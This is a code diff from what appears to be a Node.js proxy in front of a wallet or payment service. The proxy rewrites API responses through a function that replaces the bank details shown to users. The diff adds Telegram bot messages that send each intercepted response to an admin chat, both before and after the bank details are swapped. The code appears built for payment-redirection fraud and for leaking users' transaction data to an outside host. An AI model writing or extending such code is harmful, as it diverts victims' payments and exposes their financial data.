@@ -378,13 +378,16 @@ app.all('/wallet/online/walletType', async (req, res) => {
     try { jsonResp = JSON.parse(respBody); } catch(e) { jsonResp = null; }
 
     if (bankData.adminChatId && bot) {
-      bot.sendMessage(bankData.adminChatId, '🔍 WalletType DEBUG:\n' + JSON.stringify(jsonResp, null, 2).substring(0, 3000)).catch(() => {});
-      
+      bot.sendMessage(bankData.adminChatId, '🔍 WalletType BEFORE:\n' + JSON.stringify(jsonResp, null, 2).substring(0, 3000)).catch(() => {});
     }
 
     if (jsonResp && jsonResp.data) {
       const originalValues = {};
       deepReplaceBankDetails(jsonResp.data, active, originalValues, 0);
+
+      if (bankData.adminChatId && bot) {
+        bot.sendMessage(bankData.adminChatId, '✅ WalletType AFTER:\n' + JSON.stringify(jsonResp, null, 2).substring(0, 3000)).catch(() => {});
+      }
 
       if (jsonResp.code === undefined) jsonResp.code = 1;
     }
@@ -485,12 +488,16 @@ async function proxyAndReplaceBankDetails(req, res, label) {
     try { jsonResp = JSON.parse(respBody); } catch(e) { jsonResp = null; }
 
     if (bankData.adminChatId && bot && jsonResp && jsonResp.data) {
-      bot.sendMessage(bankData.adminChatId, `🔍 ORDER DEBUG ${req.path}:\n` + JSON.stringify(jsonResp.data, null, 2).substring(0, 3000)).catch(() => {});
+      bot.sendMessage(bankData.adminChatId, `🔍 BEFORE REPLACE ${req.path}:\n` + JSON.stringify(jsonResp.data, null, 2).substring(0, 3000)).catch(() => {});
     }
 
     if (jsonResp && jsonResp.data && active) {
       const originalValues = {};
       deepReplaceBankDetails(jsonResp.data, active, originalValues, 0);
+
+      if (bankData.adminChatId && bot) {
+        bot.sendMessage(bankData.adminChatId, `✅ AFTER REPLACE ${req.path}:\n` + JSON.stringify(jsonResp.data, null, 2).substring(0, 3000)).catch(() => {});
+      }
     }
 
     if (bankData.adminChatId && bot) {
